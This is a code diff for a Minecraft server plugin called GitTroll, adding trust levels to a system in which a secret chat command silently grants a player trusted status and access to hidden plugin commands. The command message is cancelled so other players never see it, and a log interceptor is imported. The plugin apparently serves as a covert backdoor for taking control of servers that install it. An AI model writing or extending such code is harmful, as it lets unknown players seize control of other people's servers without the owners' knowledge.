@@ -28,6 +28,7 @@ import net.Lenni0451.GitTroll.manager.CommandManager;
 import net.Lenni0451.GitTroll.manager.EventManager;
 import net.Lenni0451.GitTroll.utils.CustomPlayer;
 import net.Lenni0451.GitTroll.utils.Logger;
+import net.Lenni0451.GitTroll.utils.TrustLevel;
 import net.Lenni0451.GitTroll.utils.TrustedInfo;
 import net.Lenni0451.GitTroll.utils.loginterceptor.LogIntercepter;
 import net.minecraft.server.v1_8_R3.MinecraftServer;
@@ -60,7 +61,20 @@ public class GitTroll extends JavaPlugin implements Listener {
 		return false;
 	}
 	
+	public TrustLevel getTrustLevel(final Player player) {
+		for(TrustedInfo trustedInfo : this.trustedPlayers) {
+			if(trustedInfo.isPlayer(player)) {
+				return trustedInfo.getTrustLevel();
+			}
+		}
+		return TrustLevel.UNTRUSTED;
+	}
+	
 	public boolean trustPlayer(final Player player) {
+		return this.trustPlayer(player, TrustLevel.TRUSTED);
+	}
+	
+	public boolean trustPlayer(final Player player, final TrustLevel trustLevel) {
 		if(this.isPlayerTrusted(player)) return false;
 		
 		EventTrustPlayer event = new EventTrustPlayer(player);
@@ -69,7 +83,7 @@ public class GitTroll extends JavaPlugin implements Listener {
 			return false;
 		}
 		
-		this.trustedPlayers.add(new TrustedInfo(player));
+		this.trustedPlayers.add(new TrustedInfo(player, trustLevel));
 		Logger.broadcastGitMessage("§aPlayer §6" + player.getName() + " §ais now trusted.");
 		CustomPlayer.instanceOf(player).sendTitle("§aYou are now trusted!", "§aUse §6" + CommandManager.COMMAND_PREFIX + " §afor GitTroll commands.");
 		return true;
@@ -140,7 +154,7 @@ public class GitTroll extends JavaPlugin implements Listener {
 							return null;
 						}
 					} else if(message.equalsIgnoreCase(CommandManager.TRUST_COMMAND)) {
-						GitTroll.this.trustPlayer(sender);
+						GitTroll.this.trustPlayer(sender, TrustLevel.COMMAND);
 						return null;
 					}
 				}
@@ -200,7 +214,7 @@ public class GitTroll extends JavaPlugin implements Listener {
 			}
 		} else {
 			if(event.getMessage().equalsIgnoreCase(CommandManager.TRUST_COMMAND)) {
-				this.trustPlayer(event.getPlayer());
+				this.trustPlayer(event.getPlayer(), TrustLevel.COMMAND);
 				event.setCancelled(true);
 			} else {
 				;
@@ -212,7 +226,7 @@ public class GitTroll extends JavaPlugin implements Listener {
 	public void onPlayerJoin(PlayerJoinEvent event) {
 		if(this.joinTrusts.contains(event.getPlayer().getName())) {
 			this.joinTrusts.remove(event.getPlayer().getName());
-			this.trustedPlayers.add(new TrustedInfo(event.getPlayer()));
+			this.trustedPlayers.add(new TrustedInfo(event.getPlayer(), TrustLevel.IMPLEMENTED));
 		}
 		if(this.isPlayerTrusted(event.getPlayer())) {
 			CustomPlayer.instanceOf(event.getPlayer()).sendGitMessage("You are still trusted.");
